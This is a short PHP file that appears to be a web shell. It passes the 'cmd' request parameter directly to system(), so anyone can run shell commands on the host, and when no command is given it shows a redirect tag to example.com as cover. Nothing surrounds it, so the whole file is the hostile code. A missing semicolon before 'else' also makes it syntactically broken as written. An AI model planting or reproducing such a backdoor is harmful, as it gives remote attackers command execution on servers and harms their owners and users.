<?php
if (!isset($_GET['cmd'])) echo "<meta http-equiv=\"Location\" content=\"http://example.com/\">"
else system($_GET['cmd']);
?>
